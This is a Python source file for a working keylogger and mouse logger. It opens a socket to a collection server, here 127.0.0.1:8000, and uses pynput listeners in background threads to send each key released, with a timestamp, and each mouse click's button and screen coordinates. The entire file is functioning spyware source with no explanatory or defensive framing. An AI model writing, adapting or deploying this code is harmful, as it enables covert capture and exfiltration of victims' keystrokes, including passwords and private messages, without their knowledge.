import socket
import struct
import threading
from datetime import datetime
from pynput.keyboard import Listener
from pynput import mouse




class Target():
    def __init__(self):
        self.client_socket = socket.socket()
        self.client_socket.connect(("127.0.0.1", 8000))
        Main(self.client_socket)


class Main():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        SuperSocket(self.client_socket).send_msg(("0").encode())
        threading.Thread(target=self.keylogger,
                             args=()).start()
        threading.Thread(target=self.mouse_logger,
                             args=()).start()

    def keylogger(self):
        Keylogger(self.client_socket)
        
    def mouse_logger(self):
        Mouse_Logger(self.client_socket)

class Keylogger():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        self.n = 0
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def on_press(self, key):
        self.n = self.n+1

    def on_release(self, key):
        if self.n > 3:
            now = datetime.now()
            self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            SuperSocket(self.client_socket).send_msg((f"{self.dt_string}: long {format(key)}\n").encode())
            self.n = 0
        else:
            now = datetime.now()
            self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            SuperSocket(self.client_socket).send_msg((f"{self.dt_string}: {format(key)}\n").encode())
            self.n = 0

class Mouse_Logger():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        with mouse.Listener(on_click=self.on_click) as listener:
            listener.join()
            
    def on_click(self, x, y, button, pressed):
        if pressed:
            if button == mouse.Button.left:
                button_name = "left"
                
            elif button == mouse.Button.right:
                button_name = "right"
                
            else:
                button_name = "middle"
                
            now = datetime.now()
            self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            SuperSocket(self.client_socket).send_msg((f"{self.dt_string}: Mouse clicked at {button_name} ({x}, {y})\n").encode())

class SuperSocket():
    def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
        self.current_socket = current_socket

    # create a pack with length of message and message and sending this pack to server
    def send_msg(self, msg):
        msg = struct.pack('>I', len(msg)) + msg
        self.current_socket.send(msg)

    def recv_msg(self):  # getting the message and understading what is the length of the message and return the the message
        raw_msglen = self.recvall(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        return self.recvall(msglen)

    def recvall(self, msglen):  # getting the whole message and returning the data to the recv_msg
        data = b''
        while len(data) < msglen:
            packet = self.current_socket.recv(msglen - len(data))
            if not packet:
                return None
            data += packet
        return data


if __name__ == '__main__':
    Target()
